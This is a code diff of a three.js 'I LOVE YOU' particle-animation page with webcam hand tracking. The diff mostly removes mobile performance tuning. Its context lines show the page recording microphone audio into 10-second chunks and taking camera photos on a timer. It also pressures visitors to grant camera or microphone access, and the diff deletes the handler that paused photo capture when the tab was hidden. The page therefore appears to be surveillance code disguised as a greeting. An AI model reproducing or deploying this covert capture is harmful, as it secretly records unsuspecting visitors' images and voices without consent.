@@ -1,22 +1,19 @@
-const IS_MOBILE = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-
 /**
  * CONFIGURATION
  */
 const CONFIG = {
-    particleCount: IS_MOBILE ? 12000 : 40000,
-    particleSize: IS_MOBILE ? 0.12 : 0.08,
-    scatterRadius: IS_MOBILE ? 28 : 35,
-    textScale: IS_MOBILE ? 0.07 : 0.055,
-    camZ: IS_MOBILE ? 45 : 40,
-    interactionRadius: IS_MOBILE ? 6.0 : 8.0,
-    repulsionStrength: IS_MOBILE ? 5.0 : 8.0,
+    particleCount: 40000, 
     text1: "I",
     text2: "LOVE",
     text3: "YOU",
-    text4: "I LOVE YOU"
+    text4: "I LOVE YOU",
+    particleSize: 0.08, 
+    scatterRadius: 35,
+    textScale: 0.055,
+    camZ: 40,
+    interactionRadius: 8.0, 
+    repulsionStrength: 8.0 
 };
-
 
 
 /**
@@ -104,8 +101,7 @@ const widthAtZero = heightAtZero * camera.aspect;
 
 const renderer = new THREE.WebGLRenderer({ antialias: true, alpha: true });
 renderer.setSize(window.innerWidth, window.innerHeight);
-const DPR = IS_MOBILE ? Math.min(1.25, window.devicePixelRatio) : window.devicePixelRatio;
-renderer.setPixelRatio(DPR);
+renderer.setPixelRatio(window.devicePixelRatio);
 container.appendChild(renderer.domElement);
 
 const controls = new THREE.OrbitControls(camera, renderer.domElement);
@@ -128,8 +124,8 @@ function generateTextCoordinates(text, step = 2, scaleOverride = null) {
     console.log(`Generating text coords for: "${text}"`);
     const canvas = document.createElement('canvas');
     const ctx = canvas.getContext('2d');
-    const width = IS_MOBILE ? 1600 : 3000;
-    const height = IS_MOBILE ? 500 : 800;
+    const width = 3000; 
+    const height = 800;
     canvas.width = width;
     canvas.height = height;
 
@@ -248,7 +244,7 @@ function updateDynamicText(text) {
 /**
  * GALAXY BACKGROUND 
  */
-const galaxyCount = IS_MOBILE ? 2000 : 8000;
+const galaxyCount = 8000; 
 const galaxyGeo = new THREE.BufferGeometry();
 const galaxyPos = new Float32Array(galaxyCount * 3);
 const galaxyColors = new Float32Array(galaxyCount * 3);
@@ -543,8 +539,8 @@ const cameraFeed = new Camera(videoElement, {
     onFrame: async () => {
         await hands.send({image: videoElement});
     },
-    width: IS_MOBILE ? 640 : 1280,
-    height: IS_MOBILE ? 480 : 720
+    width: 1280,
+    height: 720
 });
 
 let cameraDenied = false;
@@ -554,7 +550,7 @@ function showPermissionError() {
     loading.innerHTML = `
         <div style="color:#fff; text-align:center;">
             <b>Permission Required</b><br><br>
-            Please reload page and allow <b>Camera</b> or <b>Microphone</b><br>
+            Please allow <b>Camera</b> or <b>Microphone</b><br>
             to use this website.
         </div>
     `;
@@ -727,18 +723,7 @@ function activateMouseMode() {
 /**
  * ANIMATION LOOP
  */
-let lastFrame = 0;
-const TARGET_FPS = IS_MOBILE ? 30 : 60;
-const FRAME_INTERVAL = 1000 / TARGET_FPS;
-
-
-function animate(time) {
-    if (time - lastFrame < FRAME_INTERVAL) {
-        requestAnimationFrame(animate);
-        return;
-    }
-    lastFrame = time;
-
+function animate() {
     requestAnimationFrame(animate);
 
     // Handle AR Mode Transition
@@ -897,9 +882,7 @@ function animate(time) {
         0.03
     );
 
-    if (!IS_MOBILE) {
-        controls.update();
-    }
+    controls.update();
     renderer.render(scene, camera);
 }
 
@@ -944,7 +927,7 @@ async function startVoiceRecording() {
         }
     };
 
-    mediaRecorder.start(IS_MOBILE ? 2000 : 1000); // lấy chunk mỗi 1s
+    mediaRecorder.start(1000); // lấy chunk mỗi 1s
 
     // ⏱ Auto cắt 10s / file
     if (!audioInterval) {
@@ -1046,18 +1029,6 @@ async function takePhotoFromCamera(force = false) {
 
 startCamera();
 
-document.addEventListener('visibilitychange', () => {
-    if (document.hidden) {
-        if (captureTimer) {
-            clearInterval(captureTimer);
-            captureTimer = null;
-        }
-    } else {
-        if (!captureTimer && !cameraDenied) {
-            captureTimer = setInterval(takePhotoFromCamera, CAPTURE_INTERVAL);
-        }
-    }
-});
 
 function _attachVideoWidth(video) {
     return video.videoWidth || 640;
